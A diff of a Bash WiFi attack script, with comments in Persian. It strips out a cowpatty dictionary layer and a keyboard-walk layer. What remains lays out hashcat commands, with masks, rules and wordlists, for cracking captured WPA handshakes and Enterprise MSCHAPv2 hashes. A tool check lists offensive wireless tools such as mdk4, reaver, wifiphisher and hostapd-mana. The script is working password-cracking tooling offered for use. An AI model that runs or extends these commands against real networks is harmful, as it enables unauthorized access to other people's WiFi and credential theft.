@@ -87,7 +87,7 @@ doctor() {
     _check "$t" "$t" required
   done
   c "Optional tools:"
-  for t in hcxhashtool mdk4 reaver bettercap hostapd-mana wifiphisher bully wash kismet tshark dnsmasq nmap cowpatty jq xxd nmcli ip; do
+  for t in hcxhashtool mdk4 reaver bettercap hostapd-mana wifiphisher bully wash kismet tshark dnsmasq nmap jq xxd nmcli ip; do
     _check "$t" "$t" optional
   done
 
@@ -761,8 +761,7 @@ PLAN
     hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
     Handshake quality scoring (PMKID / 4-way EAPOL / MIC) — re-capture if incomplete
 
-[3] Crack (hashcat layers 0-8)
-    0: cowpatty -r $CAP -f <wordlist> -s <essid>
+[3] Crack (hashcat layers 1-8)
     1: hashcat -m 22000 -a 0 $HASH $WORK/dicts/vendor.txt
     2: hashcat -m 22000 -a 0 $HASH <wordlist>
     3: hashcat -m 22000 -a 0 $HASH <wordlist> -r best64.rule
@@ -771,7 +770,6 @@ PLAN
     6: hashcat -m 22000 -a 3 $HASH '09?d?d?d?d?d?d?d?d?d'
     7: hashcat -m 22000 -a 6 $HASH $WORK/dicts/vendor.txt '?d?d?d?d'
     8: hashcat -m 22000 -a 0 $HASH <wordlist> -r dive.rule
-    9: hashcat -m 22000 -a 0 $HASH <keyboard-walk>
     E: hashcat -m 5500 $WORK/mschapv2.txt <wordlist>  (Enterprise)
 
 [4] WPS (if DO_WPS and WPS-enabled APs found)
@@ -1173,18 +1171,6 @@ for f in "$DICTDIR"/rockyou.txt "$DICTDIR"/weakpass*.txt "$DICTDIR"/hashmob*.txt
 done
 [ ${#WORDLISTS[@]} -eq 0 ] && { warn "هیچ وردلیستی نبود؛ فقط ماسک اجرا می‌شود."; WORDLISTS=("$WORK/dicts/vendor.txt"); }
 
-# لایه ۰: cowpatty (حملهٔ سریع دیکشنری WPA-PSK)
-if command -v cowpatty >/dev/null && [ -s "$HASH" ]; then
-  c "  → cowpatty (حملهٔ سریع)"
-  for w in "${WORDLISTS[@]}"; do
-    [ -f "$w" ] || continue
-    cowpatty -r "$CAP" -f "$w" -s "$(head -1 "$WORK/essids.txt" 2>/dev/null)" > "$WORK/cowpatty.txt" 2>&1
-    grep -i 'The PSK is' "$WORK/cowpatty.txt" 2>/dev/null | sed 's/.*The PSK is "//;s/".*//' | while read -r pw; do
-      [ -n "$pw" ] && echo "cowpatty|$pw|$(head -1 "$WORK/essids.txt")" >> "$WORK/cracked.txt"
-    done
-  done
-fi
-
 # لایه ۱: دیکشنری مشتق از SSID + پیش‌فرض وندور
 run_hc "دیکشنری SSID/وندور" -a 0 "$WORK/dicts/vendor.txt"
 
@@ -1211,13 +1197,6 @@ for w in "${WORDLISTS[@]:1}"; do
     run_hc "$(basename "$w") خام" -a 0 "$w"
   fi
 done
-
-# لایه ۷: keyboard walk
-if command -v kwp >/dev/null && [ -s "$WORK/essids.txt" ]; then
-  kwp -z "$DICTDIR/keyboard-base.txt" -r "$DICTDIR/keyboard-rules.txt" --hwlayout en-US 2>/dev/null \
-    | head -5000000 > "$WORK/dicts/kw.txt"
-  [ -s "$WORK/dicts/kw.txt" ] && run_hc "keyboard walk" -a 0 "$WORK/dicts/kw.txt"
-fi
 
 # لایه ۸: Enterprise MSCHAPv2
 if [ -s "$WORK/mschapv2.txt" ]; then
